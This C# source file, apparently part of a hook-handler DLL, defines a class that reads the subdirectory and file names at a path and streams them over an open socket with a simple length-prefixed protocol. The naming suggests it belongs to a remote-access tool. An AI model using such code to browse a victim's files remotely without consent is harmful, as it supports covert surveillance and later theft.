using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace HookHandlerDLL
{
    class SystemInformer
    {
        Socket socket;
        public SystemInformer(Socket socket)
        {
            this.socket = socket;
        }

        public void Run(string path)
        {
            List<string> directories=new List<string>(), files= new List<string>();
            DirectoryInfo directoryInfo = new DirectoryInfo(path);
            try
            {
                foreach (DirectoryInfo subDir in directoryInfo.GetDirectories())
                {
                    SendSystemInfo(subDir.Name, 3);
                }
            }
            catch { }

            try
            {
                foreach (FileInfo file in directoryInfo.GetFiles())
                {
                    SendSystemInfo(file.Name, 4);
                }
            }
            catch { }

            SendEndSignal();
        }

        private void SendSystemInfo(string innfo,byte type)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(innfo);
            socket.Send(new byte[] { type });
            SendVarData(buffer);
        }

        private void SendEndSignal()
        {
            socket.Send(new byte[] { 9 });
            SendVarData(new byte[] { });
        }

        private void SendVarData(byte[] data)
        {
            int total = 0;
            int size = data.Length;
            int dataleft = size;


            byte[] datasize = new byte[4];
            datasize = BitConverter.GetBytes(size);
            socket.Send(datasize);

            while (total < size)
            {
                int sent = socket.Send(data, total, dataleft, SocketFlags.None);
                total += sent;
                dataleft -= sent;
            }

        }
    }
}
